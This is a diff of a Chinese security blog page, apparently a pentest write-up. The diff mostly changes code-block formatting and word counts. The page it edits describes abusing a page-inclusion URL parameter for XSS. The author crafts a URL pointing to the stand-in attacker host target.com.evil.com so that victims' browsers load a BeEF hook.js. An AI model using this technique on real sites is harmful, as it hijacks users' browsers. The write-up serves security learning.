@@ -437,7 +437,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    771
+                    782
                 </div>
                 
 
@@ -459,6 +459,9 @@
         <hr class="clearfix">
 
         
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.css">
+        
 
         
 
@@ -468,7 +471,8 @@
 <p>为了展示出较好的效果同时不泄露网站相关信息， 这里我在自己本地按照当时目标的情况简单搭建了一个靶场。</p>
 <p>注意：文中的<code>target.com</code>代指目标域名，<code>evil.com</code>代指自己的攻击域名。</p>
 <h1 id="0x01-发现"><a href="#0x01-发现" class="headerlink" title="0x01 发现"></a>0x01 发现</h1><p>在测试过程中，发现目标存在这样的一个 URL</p>
-<pre><code>http://target.com/index.html?/test.html</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;target.com&#x2F;index.html?&#x2F;test.html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/diffxss-1.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
 <p>在当前页面中包含了URL参数里的页面，如果将<code>/test.html</code>改为不存在的页面就会提示404</p>
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/diffxss-2.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
@@ -476,7 +480,8 @@
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/diffxss-3.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
 <h1 id="0x02-思考利用"><a href="#0x02-思考利用" class="headerlink" title="0x02 思考利用"></a>0x02 思考利用</h1><p>目标看到这里，刚开始只是尝试的一些常规的 XSS Payload，发现目标都进行了很好的过滤，于是陷入了短暂的思考中。</p>
 <p>之后再看看源码，想着既然它是把参数后的值拼接到站点域名后面，那如果我有个<code>target.com.evil.com</code>的域名，我在URL中传参<code>.evil.com</code>，页面拼接后所访问的地址不就是这样：</p>
-<pre><code>http://target.com.evil.com</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;target.com.evil.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>这样一来，我在<code>target.com.evil.com</code>站点下，开个beef，在我访问<code>http://target.com/index.html?.evil.com</code>的时候，目标页面就会访问到我自己的域名，如果访问的域名页面中包含了 beef 的 hook.js，那目标不就上线了嘛，nice</p>
 <p><strong>开整！</strong></p>
 <p>首先要有个域名和 vps ，有了域名后再设置一个 <code>target.com</code> 的子域名，设置子域名也很简单，直接在域名的DNS记录中添加一条A记录即可，名称就是<code>target.com</code>，内容就是要解析的 vps IP 地址。</p>
@@ -488,7 +493,8 @@
 </blockquote>
 <p>在 beef 的 hook.js 页面可以成功访问之后，就可以构造 URL 了，这时只要 URL 后传入一个包含 hook.js 的页面就可以上线了，这里以 beef 的 demo 页面<code>/demos/basic.html</code>作为示例。</p>
 <p>最后构造 URL 为：</p>
-<pre><code>http://target.com/index.html?.evil.com:3000/demos/basic.html</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;target.com&#x2F;index.html?.evil.com:3000&#x2F;demos&#x2F;basic.html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>浏览器打开该页面</p>
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/diffxss-6.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
 <p>可以看到当前页面成功访问到了<code>target.com.evil.com:3000/demos/basic.html</code>，此时看看 beef 里有没有上线</p>
@@ -921,7 +927,7 @@
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">162.6k</span>&nbsp;字
+                class="white-color">164k</span>&nbsp;字
             
             
             
